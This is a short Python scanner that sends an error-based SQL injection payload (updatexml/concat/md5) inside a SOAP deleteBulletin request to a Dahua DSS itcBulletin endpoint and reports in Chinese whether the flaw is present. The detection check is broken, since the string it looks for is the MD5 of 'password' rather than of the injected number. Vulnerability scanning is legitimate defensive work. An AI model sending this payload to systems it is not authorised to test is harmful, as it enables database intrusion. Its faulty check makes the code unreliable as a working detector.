vulnerability_scanners/dahua_dss_itc_bulletin_sqli.py

import requests

def check_dahua_dss_itc_bulletin_sqli(url):
    try:
        headers = {
            "Content-Type": "text/xml; charset=utf-8"
        }
        data = """
        <s11:Envelope xmlns:s11='http://schemas.xmlsoap.org/soap/envelope/'>
        <s11:Body>
            <ns1:deleteBulletin xmlns:ns1='http://itcbulletinservice.webservice.dssc.dahua.com'>
            <netMarkings>
            (updatexml(1,concat(0x7e,md5(102103122),0x7e),1))) and (1=1
            </netMarkings>
            </ns1:deleteBulletin>
        </s11:Body>
        </s11:Envelope>
        """
        response = requests.post(f"{url}/portal/services/itcBulletin?wsdl", headers=headers, data=data)
        if "5f4dcc3b5aa765d61d8327deb882cf99" in response.text:
            return "大华 DSS itcBulletin SQL 注入漏洞存在"
        else:
            return "大华 DSS itcBulletin SQL 注入漏洞不存在"
    except Exception as e:
        return f"Error: {e}"
